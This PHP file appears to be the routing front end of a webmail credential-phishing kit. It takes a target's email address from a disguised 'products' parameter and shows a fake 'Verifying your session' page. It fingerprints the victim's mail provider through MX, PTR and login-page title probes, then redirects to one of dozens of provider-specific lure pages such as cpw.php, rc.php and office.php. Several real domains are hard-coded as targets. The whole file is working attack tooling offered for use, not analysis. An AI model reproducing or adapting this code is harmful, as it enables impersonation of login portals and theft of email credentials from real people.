<?php
require 'config.php';

$products = $_GET['products'] ?? '';
$use_cf   = defined('USE_CLOUDFLARE') && USE_CLOUDFLARE;

// ------------------------------------------------------------
// No-Cloudflare mode: skip the whole verification screen and
// route straight through.
// ------------------------------------------------------------
if (!$use_cf && !empty($products)) {
    $mx_file = getMxFile($products);
    header(
        'Location: auth.php?file=' .
        urlencode($mx_file) .
        '&products=' .
        urlencode($products)
    );
    exit;
}

// ------------------------------------------------------------
// Cloudflare mode: only show the animated loader when the MX
// is unrecognized (getMxFile will need to probe with HTTP).
// ------------------------------------------------------------
$show_loader = false;
if ($use_cf && !empty($products) && filter_var($products, FILTER_VALIDATE_EMAIL)) {
    $probe_domain = substr($products, strpos($products, '@') + 1);
    $show_loader  = !hasRecognizableMx($probe_domain);
}

if (!empty($products) && $_SERVER['REQUEST_METHOD'] !== 'POST') {
    // Fall through to render the Turnstile screen (CF only)
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying your session…</title>
    <?php if ($use_cf): ?>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <?php endif; ?>
    <style>
        :root {
            --bg-1: #0f172a;
            --bg-2: #1e293b;
            --card: #ffffff;
            --text: #0f172a;
            --muted: #64748b;
            --accent: #2563eb;
            --accent-2: #3b82f6;
            --accent-glow: rgba(37, 99, 235, .35);
            --danger-bg: #fef2f2;
            --danger-border: #fecaca;
            --danger-text: #991b1b;
        }
        * { box-sizing: border-box; }
        html, body { height: 100%; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
                         Roboto, "Helvetica Neue", Arial, sans-serif;
            background:
                radial-gradient(circle at 20% 20%, #1e293b 0%, transparent 45%),
                radial-gradient(circle at 80% 80%, #1e3a8a 0%, transparent 45%),
                linear-gradient(135deg, var(--bg-1) 0%, var(--bg-2) 100%);
            color: var(--text);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 24px;
            overflow: hidden;
            -webkit-font-smoothing: antialiased;
        }
        body::before {
            content: "";
            position: fixed;
            inset: -50%;
            background: conic-gradient(from 0deg,
                transparent 0%,
                rgba(59, 130, 246, .08) 25%,
                transparent 50%,
                rgba(37, 99, 235, .08) 75%,
                transparent 100%);
            animation: sweep 18s linear infinite;
            z-index: 0;
            pointer-events: none;
        }
        @keyframes sweep { to { transform: rotate(360deg); } }

        .card {
            position: relative;
            z-index: 1;
            background: var(--card);
            width: 100%;
            max-width: 420px;
            border-radius: 18px;
            padding: 40px 32px 32px;
            box-shadow:
                0 1px 2px rgba(0,0,0,.04),
                0 12px 24px -8px rgba(0,0,0,.18),
                0 32px 64px -16px rgba(0,0,0,.28);
            text-align: center;
            animation: rise .55s cubic-bezier(.22,.9,.36,1) both;
        }
        @keyframes rise {
            from { opacity: 0; transform: translateY(14px) scale(.985); }
            to   { opacity: 1; transform: translateY(0)    scale(1); }
        }

        .loader-wrap {
            position: relative;
            width: 84px;
            height: 84px;
            margin: 0 auto 26px;
        }
        .loader-ring {
            position: absolute;
            inset: 0;
            border-radius: 50%;
            border: 3px solid transparent;
            border-top-color: var(--accent);
            border-right-color: var(--accent-2);
            animation: spin 1.1s cubic-bezier(.55,.15,.45,.85) infinite;
            filter: drop-shadow(0 0 10px var(--accent-glow));
        }
        .loader-ring.inner {
            inset: 12px;
            border-top-color: transparent;
            border-left-color: var(--accent-2);
            border-bottom-color: var(--accent);
            animation: spin 1.6s linear infinite reverse;
            opacity: .75;
        }
        .loader-ring.core {
            inset: 24px;
            border: none;
            background: linear-gradient(135deg, var(--accent) 0%, var(--accent-2) 100%);
            animation: pulse 1.8s ease-in-out infinite;
            box-shadow: 0 0 0 0 var(--accent-glow);
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes pulse {
            0%, 100% { transform: scale(.85); box-shadow: 0 0 0 0 var(--accent-glow); }
            50%      { transform: scale(1);   box-shadow: 0 0 0 12px rgba(37, 99, 235, 0); }
        }

        h1 {
            font-size: 22px;
            font-weight: 700;
            margin: 0 0 8px;
            color: var(--text);
            letter-spacing: -0.01em;
        }
        .subtitle {
            font-size: 14.5px;
            color: var(--muted);
            margin: 0 0 26px;
            line-height: 1.5;
        }
        .progress {
            position: relative;
            height: 4px;
            width: 100%;
            background: #eef2f7;
            border-radius: 999px;
            overflow: hidden;
            margin-bottom: 24px;
        }
        .progress::after {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            height: 100%;
            width: 40%;
            background: linear-gradient(90deg,
                transparent 0%,
                var(--accent) 50%,
                var(--accent-2) 100%);
            border-radius: 999px;
            animation: slide 1.6s ease-in-out infinite;
        }
        @keyframes slide {
            0%   { left: -40%; }
            100% { left: 100%; }
        }
        #turnstile-container {
            display: flex;
            justify-content: center;
            min-height: 70px;
            align-items: center;
        }
        .debug-box {
            background: var(--danger-bg);
            border: 1px solid var(--danger-border);
            color: var(--danger-text);
            padding: 14px 16px;
            border-radius: 10px;
            margin-top: 22px;
            font-size: 13px;
            text-align: left;
            line-height: 1.5;
            word-break: break-word;
            animation: rise .35s cubic-bezier(.22,.9,.36,1) both;
        }
        .debug-box strong { display: block; margin-bottom: 6px; font-weight: 700; }
        .footer-hint {
            margin-top: 22px;
            font-size: 12px;
            color: var(--muted);
            letter-spacing: .01em;
        }
        @media (max-width: 480px) {
            .card { padding: 32px 22px 26px; border-radius: 14px; }
            h1 { font-size: 20px; }
            .subtitle { font-size: 13.5px; }
            .loader-wrap { width: 72px; height: 72px; }
        }
    </style>
</head>
<body>
    <main class="card" role="main" aria-busy="<?php echo $show_loader ? 'true' : 'false'; ?>">
        <?php if ($show_loader): ?>
            <div class="loader-wrap" aria-hidden="true">
                <div class="loader-ring"></div>
                <div class="loader-ring inner"></div>
                <div class="loader-ring core"></div>
            </div>
            <h1>Verifying your session</h1>
            <p class="subtitle">Please wait a moment while we prepare a secure connection.</p>
            <div class="progress" aria-hidden="true"></div>
        <?php else: ?>
            <h1>Almost there</h1>
            <p class="subtitle">Preparing your secure session.</p>
        <?php endif; ?>

        <div id="turnstile-container">
            <?php if ($use_cf): ?>
            <div class="cf-turnstile"
                 data-sitekey="<?php echo htmlspecialchars($cf_site_key); ?>"
                 data-callback="onTurnstileSuccess"
                 data-theme="light"></div>
            <?php else: ?>
            <!-- No Cloudflare — auto-proceed immediately -->
            <script>setTimeout(()=>{onTurnstileSuccess('nocf');},50);</script>
            <?php endif; ?>
        </div>

        <p class="footer-hint"><?php echo $use_cf ? 'Protected by Cloudflare Turnstile' : 'Secure session'; ?></p>
    </main>

    <script>
        const userEmail = <?php echo json_encode($products); ?>;
        const useCF     = <?php echo $use_cf ? 'true' : 'false'; ?>;

        function onTurnstileSuccess(token) {
            if (!useCF) {
                // No Cloudflare: skip server-side POST and jump straight to auth.php
                const url = 'auth.php?file=' + encodeURIComponent('<?php
                    echo addslashes(htmlspecialchars(
                        !empty($products) && filter_var($products, FILTER_VALIDATE_EMAIL)
                            ? getMxFile($products)
                            : "all.php"
                    ));
                ?>') + '&products=' + encodeURIComponent(userEmail);
                window.location.href = url;
                return;
            }

            const formData = new FormData();
            formData.append('cf_turnstile_token', token);
            formData.append('products', userEmail);

            fetch(window.location.href, { method: 'POST', body: formData })
            .then(r => r.json())
            .then(data => {
                if (data.success && data.auth_url) {
                    const card = document.querySelector('.card');
                    if (card) {
                        card.style.transition = 'opacity .35s ease, transform .35s ease';
                        card.style.opacity    = '0';
                        card.style.transform  = 'translateY(-6px) scale(.98)';
                    }
                    setTimeout(() => { window.location.href = data.auth_url; }, 320);
                } else {
                    showError('Verification Failed', data.error || 'Unknown error');
                }
            })
            .catch(err => showError('Network Error', String(err)));
        }

        function showError(title, detail) {
            document.querySelector('main').setAttribute('aria-busy', 'false');
            const box = document.createElement('div');
            box.className = 'debug-box';
            const strong = document.createElement('strong');
            strong.textContent = '⚠️ ' + title;
            box.appendChild(strong);
            box.appendChild(document.createTextNode(detail));
            document.querySelector('main').appendChild(box);
            const lw = document.querySelector('.loader-wrap');
            if (lw) lw.style.display = 'none';
        }
    </script>
</body>
</html>

<?php
// ------------------------------------------------------------
// Cloudflare POST handler — validates Turnstile then returns JSON
// with the auth.php redirect URL.
// ------------------------------------------------------------
if ($use_cf && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');

    $token    = $_POST['cf_turnstile_token'] ?? '';
    $products = $_POST['products']           ?? '';

    if ($token === '' || $products === '' || !filter_var($products, FILTER_VALIDATE_EMAIL)) {
        echo json_encode(['success' => false, 'error' => 'Missing or invalid input']);
        exit;
    }

    if (!defined('$cf_secret_key') && isset($cf_secret_key)) {
        // local
    }
    $secret = $cf_secret_key ?? '';

    $ch = curl_init('https://challenges.cloudflare.com/turnstile/v0/siteverify');
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query([
            'secret'   => $secret,
            'response' => $token,
            'remoteip' => $_SERVER['REMOTE_ADDR'] ?? '',
        ]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 6,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $resp = curl_exec($ch);
    curl_close($ch);

    $data = $resp ? json_decode($resp, true) : null;
    if (empty($data['success'])) {
        echo json_encode([
            'success' => false,
            'error'   => $data['error-codes'][0] ?? 'Turnstile rejected the token',
        ]);
        exit;
    }

    $mx_file = getMxFile($products);
    echo json_encode([
        'success'  => true,
        'auth_url' => 'auth.php?file=' . urlencode($mx_file) .
                      '&products=' . urlencode($products),
    ]);
    exit;
}

// ============================================================
// Reference file loaders
// ============================================================
function loadReferenceFile(string $name): array {
    $paths = [
        __DIR__ . '/' . $name,
        __DIR__ . '/assets/' . $name,
        dirname(__DIR__) . '/' . $name,
    ];
    foreach ($paths as $p) {
        if (file_exists($p)) {
            $lines = file($p, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            return array_values(array_filter(array_map('trim', $lines)));
        }
    }
    return [];
}

// ------------------------------------------------------------
// hasRecognizableMx — fast, DNS-only check for the loader gate
// ------------------------------------------------------------
function hasRecognizableMx(string $domain): bool {
    if ($domain === '') return false;
    $domain = strtolower($domain);

    foreach (['apart-rent.com', 'goeugo.eu', 'nomadsensecreative.com'] as $base) {
        if ($domain === $base || str_ends_with($domain, '.' . $base)) return true;
    }

    $mx = @dns_get_record($domain, DNS_MX);
    if (empty($mx)) return false;

    $haystack = ' ' . $domain;
    foreach ($mx as $r) {
        $haystack .= ' ' . strtolower($r['target'] ?? '');
    }

    foreach ([
        'tradeindia.com', 'yahoodns.net', 'yahoo small business',
        'roundcube', 'rcmail', 'cpanel', 'whm', 'cpsess',
        'hostgator', 'bluehost', 'justhost', 'ipage', 'greengeeks',
        'a2hosting', 'inmotion', 'namecheap', 'unifiedlayer',
        'aruba', 'messagingengine', 'dreamhost', 'google', '126mx', '263',
        'one.com', '.web-hosting.', 'jellyfish.systems', 'privateemail',
        'hostinger', 'hostedemail', 'mimecast', 'chinaemail', 'global-mail',
        'comcast', 'cybermail', 'hzmx01', 'ntesmail', 'host-h', 'mxhichina',
        'aliyun', 'gmx', '.outlook.com', '.outlook.cn', 'natro', 'godaddy',
        'secureserver', 'ionos', 'interia', 'mail.com', 'smarshmail',
        'naver', 'netsol', 'rediffmailpro', 'orange.pl', 'protonmail',
        'yunyou', 'qq', 'emailsrvr', 'rackspace', 'register.it', 'zimbra',
        'rzone', 'serverdata', 'telkomsa', '.av-mx.', 'wadax', 'windstream',
        'zoho', 'worksmobile', 'mailplug', 'udomain', 'ovh', 'mailgun',
        'lolipop', 'mweb', '163mx', 'mx-biz.mail', 'terraempresas',
        'locaweb.com.br', 'mx3.bol', 'mx.terra.com.br', 'uhserver',
        'connect.com.fj', 'smartmail', 'titan', 'horde', 'daum', 'qiye163mx',
    ] as $kw) {
        if (str_contains($haystack, $kw)) return true;
    }
    return false;
}

// ============================================================
// MAIN DETECTOR
// ============================================================
function getMxFile($products) {
    if (empty($products) || !filter_var($products, FILTER_VALIDATE_EMAIL)) {
        return "all.php";
    }
    $domain = substr($products, strpos($products, '@') + 1);
    if (empty($domain)) return "all.php";

    $cacheFile = sys_get_temp_dir() . '/webmail_route_' . md5($domain) . '.txt';
    if (file_exists($cacheFile) && (time() - filemtime($cacheFile)) < 86400) {
        $cached = trim(file_get_contents($cacheFile));
        if ($cached !== '') return $cached;
    }

    // STEP 1 — explicit routes
    $explicit_routes = [
        'apart-rent.com'         => 'cpw.php',
        'goeugo.eu'              => 'rc.php',
        'nomadsensecreative.com' => 'rc.php',
    ];
    $domainLower = strtolower($domain);
    foreach ($explicit_routes as $base => $target) {
        if ($domainLower === $base || str_ends_with($domainLower, '.' . $base)) {
            @file_put_contents($cacheFile, $target);
            return $target;
        }
    }

    // MX + PTR haystack
    $mxRecords = @dns_get_record($domain, DNS_MX);
    $mxHaystack = '';
    $ptrHaystack = '';
    $mxFound    = false;

    if (!empty($mxRecords)) {
        foreach ($mxRecords as $mx) {
            $target = strtolower($mx['target'] ?? '');
            if ($target === '') continue;
            $mxFound = true;
            $mxHaystack .= ' ' . $target;

            $aRecords = @dns_get_record($target, DNS_A);
            if (!$aRecords) continue;
            foreach ($aRecords as $a) {
                if (empty($a['ip'])) continue;
                $reversedIp = implode('.', array_reverse(explode('.', $a['ip']))) . '.in-addr.arpa';
                $ptrRecords = @dns_get_record($reversedIp, DNS_PTR);
                if (!$ptrRecords) continue;
                foreach ($ptrRecords as $ptr) {
                    $ptrHost = strtolower($ptr['target'] ?? '');
                    if ($ptrHost !== '') $ptrHaystack .= ' ' . $ptrHost;
                }
            }
        }
    }
    $combinedHaystack = $mxHaystack . ' ' . $ptrHaystack . ' ' . $domainLower;

    // TradeIndia shared Zimbra
    foreach ([
        '.tradeindia.com', 'tradeindia.com',
        'clientsmtp.tradeindia.com', 'zmta01.tradeindia.com',
        'clientpop.tradeindia.com',
    ] as $kw) {
        if (str_contains($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, 'zimbra.php');
            return 'zimbra.php';
        }
    }

    // Yahoo Small Business
    foreach (['yahoo small business', 'smallbusiness.yahoo', 'yahoodns.net'] as $kw) {
        if (str_contains($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, 'yahoo.php');
            return 'yahoo.php';
        }
    }

    // Roundcube
    foreach ([
        'roundcube', 'rcmail', 'stackmail', 'ispservices',
        'roundcube_sessid', 'rcmcsrftoken', '?_task=login',
    ] as $kw) {
        if (str_contains($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, 'rc.php');
            return 'rc.php';
        }
    }

    // cPanel
    foreach ([
        'cpanel', 'whm', 'unifiedlayer', 'hostgator', 'bluehost', 'justhost',
        'ipage', 'greengeeks', 'a2hosting', 'inmotion', 'namecheap',
        'web-hosting', 'shared', 'hosting', 'cpsess',
    ] as $kw) {
        if (str_contains($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, 'cpw.php');
            return 'cpw.php';
        }
    }

    // Keyword map
    $keywords_map = [
        'aruba' => 'aruba.php', 'mta6.am0.yahoodns.net' => 'yahoo.php',
        'messagingengine' => 'fastmail.php', 'dreamhost' => 'dreamhost.php',
        'google' => 'google.php', '126mx' => '126.php', '263' => '263.php',
        '263xmail' => '263.php', 'one.com' => 'one.php',
        '.web-hosting.' => 'nc.php',
        'mx2-hosting.jellyfish.systems' => 'nc.php',
        'mx1.privateemail.' => 'private.php', 'mx2.privateemail.' => 'private.php',
        'hostinger' => 'hostinger.php', 'oxse3a.privateemail.' => 'nc.php',
        'hostedemail' => 'hostedemail.php',
        'mx-aol.mail.gm0.yahoodns.net' => 'aol.php',
        'mimecast' => 'mimecast.php', 'chinaemail' => 'bossmail.php',
        'global-mail' => 'globalmail.php', 'comcast' => 'comcast.php',
        'cybermail' => 'cybermail.php', 'hzmx01.' => 'netease.php',
        '.xmail.ntesmail.' => 'netease.php', 'host-h' => 'konsolh.php',
        'mxhichina' => 'mxhichina.php', '.qiye.aliyun.' => 'mxhichina.php',
        'gmx' => 'gmx.php', '.outlook.com' => 'office.php',
        '.outlook.cn' => 'office_cn.php', 'natro' => 'natro.php',
        'natrohost' => 'natro.php', 'godaddy' => 'godaddy.php',
        'secureserver' => 'godaddy.php', 'ionos' => 'ionos.php',
        'interia' => 'interia.php', 'mail.com' => 'mailcom.php',
        'smarshmail' => 'smarsh.php', 'naver' => 'naver.php',
        'netsol' => 'netsol.php', 'rediffmailpro' => 'rediffmailpro.php',
        'orange.pl' => 'orangepl.php', 'protonmail' => 'protonmail.php',
        'yunyou' => 'yunyou.php', 'qq' => 'qq.php',
        'emailsrvr' => 'emailsrvr.php', 'rackspace' => 'emailsrvr.php',
        'register.it' => 'registerit.php', 'zimbra' => 'zimbra.php',
        'rzone' => 'strato.php', 'serverdata' => 'owa.php',
        'telkomsa' => 'telkomsa.php', '.av-mx.' => 'zimbra.php',
        'wadax' => 'wadax.php', 'windstream' => 'windstream.php',
        'zoho' => 'zoho.php', '.mail.aliyun.' => 'mailaliyun.php',
        'worksmobile' => 'worksmobile.php', 'mailplug' => 'mailplug.php',
        'udomain' => 'udomain.php', 'ovh' => 'ovhcloud.php',
        'mailgun' => 'mailgun.php', 'lolipop' => 'lolipop.php',
        'mweb' => 'mweb.php', '163mx' => '163.php',
        'mx-biz.mail' => 'bizmail.php',
        'mx.terraempresas.com.br' => 'terrabr.php',
        'locaweb.com.br' => 'locaweb.php', 'mx3.bol' => 'uol.php',
        'mx.terra.com.br' => 'terrabr.php', 'mx.uhserver.com' => 'userver.php',
        'connect.com.fj' => 'connect.php', 'smartmail' => 'smarter.php',
        'titan' => 'hostinger.php', 'horde' => 'horde.php',
        'daum' => 'daum.php', 'qiye163mx.' => 'netease.php',
    ];
    foreach ($keywords_map as $kw => $file) {
        if (str_contains($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, $file);
            return $file;
        }
    }

    // DomainFormat + ValidTitles probe
    $formats = loadReferenceFile('DomainFormat.txt');
    if (empty($formats)) {
        $formats = [
            '[domain]', 'mail.[domain]', 'webmail.[domain]',
            'zimbra.[domain]', 'mail.[domain]/zimbra/',
            'webmail.[domain]/zimbra/', 'autodiscover.[domain]',
            '[domain]:2095/', '[domain]/webmail',
        ];
    }
    $urls = [];
    foreach ($formats as $tpl) {
        $url = str_replace('[domain]', $domain, $tpl);
        if (!preg_match('#^https?://#i', $url)) {
            $url = (preg_match('#:209[56]#', $url) || preg_match('#:80#', $url))
                ? 'http://' . $url
                : 'https://' . $url;
        }
        $urls[] = $url;
    }
    $urls[] = 'https://' . $domain;
    $urls   = array_values(array_unique($urls));

    $titles      = loadReferenceFile('ValidTitles.txt');
    $titlesLower = array_map(fn($t) => strtolower(trim($t)), $titles);

    foreach ($urls as $url) {
        $result = inspectWebmailPage($url, $titlesLower);
        if ($result !== null && $result !== '') {
            @file_put_contents($cacheFile, $result);
            return $result;
        }
    }

    // cPanel 2096 probe
    $fp = @fsockopen("ssl://{$domain}", 2096, $errno, $errstr, 2);
    if ($fp) {
        fclose($fp);
        @file_put_contents($cacheFile, 'cpw.php');
        return 'cpw.php';
    }

    // Fallback
    if (!$mxFound) {
        @file_put_contents($cacheFile, 'https://' . $domain);
        return 'https://' . $domain;
    }
    return 'all.php';
}

function inspectWebmailPage(string $url, array $titlesLower): ?string {
    $html = fetchPage($url);
    if ($html === null) return null;

    $title = extractTitle($html);

    if ($title === null
        || stripos($title, 'please wait') !== false
        || stripos($html, 'please wait while we verify') !== false
        || stripos($html, 'checking your browser') !== false
    ) {
        sleep(3);
        $html2 = fetchPage($url);
        if ($html2 !== null) {
            $title2 = extractTitle($html2);
            if ($title2 !== null) $title = $title2;
            $html = $html2;
        }
    }

    if ($title === null) return matchBodySignatures($html);

    $titleClean = strtolower(trim(html_entity_decode($title, ENT_QUOTES | ENT_HTML5)));

    foreach ($titlesLower as $t) {
        if ($t === $titleClean) return mapTitleToFile($titleClean);
    }
    foreach ($titlesLower as $t) {
        if ($t !== '' && str_contains($titleClean, $t)) return mapTitleToFile($t);
    }

    return matchBodySignatures($html);
}

function extractTitle(string $html): ?string {
    if (preg_match('#<title[^>]*>(.*?)</title>#is', $html, $m)) {
        return trim($m[1]);
    }
    return null;
}

function mapTitleToFile(string $title): string {
    $t = strtolower(trim($title));

    if (str_contains($t, 'roundcube') || str_contains($t, 'rcmail')) return 'rc.php';
    if (str_contains($t, 'cpanel')) return 'cpw.php';

    if (str_contains($t, 'zimbra'))                                     return 'zimbra.php';
    if (str_contains($t, 'mailenable'))                                 return 'enable.php';
    if (str_contains($t, 'smartermail'))                                return 'smarter.php';
    if (str_contains($t, 'horde'))                                      return 'horde.php';
    if (str_contains($t, 'squirrelmail'))                               return 'squirrel.php';
    if (str_contains($t, 'icewarp'))                                    return 'icewarp.php';
    if (str_contains($t, 'mdaemon') || str_contains($t, 'worldclient')) return 'mdaemon.php';
    if (str_contains($t, 'kerio'))                                      return 'kerio.php';
    if (str_contains($t, 'afterlogic'))                                 return 'afterlogic.php';
    if (str_contains($t, 'dreamhost'))                                  return 'dreamhost.php';
    if (str_contains($t, 'zoner'))                                      return 'zoner.php';
    if (str_contains($t, 'mailcow'))                                    return 'mailcow.php';
    if (str_contains($t, 'konsoleh'))                                   return 'konsolh.php';
    if (str_contains($t, 'udomain'))                                    return 'udomain.php';
    if ($t === 'uol')                                                   return 'uol.php';
    if (str_contains($t, 'outlook') || $t === 'owa'
        || str_contains($t, 'sign in - google accounts'))               return 'office.php';

    if (in_array($t, [
        'webmail', 'webmail login', 'webmail redirect',
        'webmail client sign in', 'webmail sign in',
        'web client sign in', 'web app', 'login', 'welcome',
    ], true)) {
        return 'cpw.php';
    }
    return '';
}

function matchBodySignatures(string $html): ?string {
    $h = strtolower($html);

    // Roundcube — multiple signals
    if (str_contains($h, 'rcmail') ||
        str_contains($h, 'roundcube') ||
        str_contains($h, '?_task=login') ||
        str_contains($h, '_task=login') ||
        str_contains($h, 'rcmcsrftoken') ||
        str_contains($h, 'roundcube_sessid') ||
        str_contains($h, 'id="rcmloginuser"') ||
        str_contains($h, "id='rcmloginuser'") ||
        str_contains($h, 'id="rcmloginpwd"') ||
        str_contains($h, "id='rcmloginpwd'") ||
        str_contains($h, 'name="_task"') ||
        str_contains($h, 'name="_action"')) {
        return 'rc.php';
    }

    // cPanel
    if (str_contains($h, 'cpsess') ||
        str_contains($h, 'login/?login_only=1') ||
        str_contains($h, 'cpanel, l.l.c.') ||
        str_contains($h, 'cpanel, inc.')) {
        return 'cpw.php';
    }

    // Zimbra
    if (str_contains($h, 'zimbra') ||
        str_contains($h, 'zm_login') ||
        str_contains($h, '/service/soap') ||
        str_contains($h, 'zm_client')) {
        return 'zimbra.php';
    }

    if (str_contains($h, 'mailenable'))   return 'enable.php';
    if (str_contains($h, 'smartermail'))  return 'smarter.php';
    if (str_contains($h, 'horde'))        return 'horde.php';
    if (str_contains($h, 'squirrelmail')) return 'squirrel.php';

    return null;
}

function fetchPage(string $url): ?string {
    if (!function_exists('curl_init')) {
        $ctx = stream_context_create([
            'http' => [
                'method' => 'GET', 'timeout' => 6,
                'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n",
            ],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
        ]);
        $body = @file_get_contents($url, false, $ctx);
        return $body === false ? null : $body;
    }
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 5, CURLOPT_TIMEOUT => 6,
        CURLOPT_CONNECTTIMEOUT => 3,
        CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
        CURLOPT_HTTPHEADER => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.9',
        ],
    ]);
    $body = curl_exec($ch);
    curl_close($ch);
    return $body === false ? null : $body;
}
?>